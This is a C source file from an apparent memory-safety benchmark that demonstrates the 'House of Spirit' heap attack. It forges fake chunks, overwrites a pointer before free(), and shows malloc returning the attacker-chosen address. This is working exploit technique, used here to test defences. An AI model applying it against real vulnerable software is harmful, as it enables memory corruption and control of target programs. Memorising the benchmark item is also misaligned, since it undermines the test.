/*  Benchmark: Heap Manipulation
 *  @author  : Secure, Trusted, and Assured Microelectronics (STAM) Center

 *  Copyright (c) 2024 Memory Safety Benchmarks (STAM/SCAI/ASU)
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *  The above copyright notice and this permission notice shall be included in
 *  all copies or substantial portions of the Software.

 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 *  THE SOFTWARE.
 */

/*  This vulnerability demonstrates a heap manipulation exploit. It involves artificially
    creating a fake chunk. The address of this fake chunk is then assigned to a chunk on 
    the heap. When the heap chunk is freed, the fake chunk address get placed onto the tcache.
    As a result, a subsequent call to malloc would allocate the artificially created chunk
*/

// https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct fast_chunk {
  size_t prev_size;
  size_t size;
  struct fast_chunk *fd;
  struct fast_chunk *bk;
  char buf[0x20];                   // chunk falls in fastbin size range
};

struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory

void *ptr, *victim;

int main(){
    ptr = malloc(0x30);                 // First malloc
    printf("ptr: %p\n", ptr);

    void *orig_ptr;
    orig_ptr = ptr;

    // Passes size check of "free(): invalid size"
    fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40

    // Passes "free(): invalid next size (fast)"
    fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40

    // Attacker overwrites a pointer that is about to be 'freed'
    ptr = (void *)&fake_chunks[0].fd;
    printf("Overwritten ptr: %p\n\n", ptr);

    // fake_chunks[0] gets inserted into fastbin
    free(ptr);

    // Pointer freed

    victim = malloc(0x30); // address returned from malloc

    printf("victim: %p\n", victim);

    if(victim!=orig_ptr)
      printf("Test Failed: Heap manipulation leading to arbitrary memory allocation\n");

    return 0;
}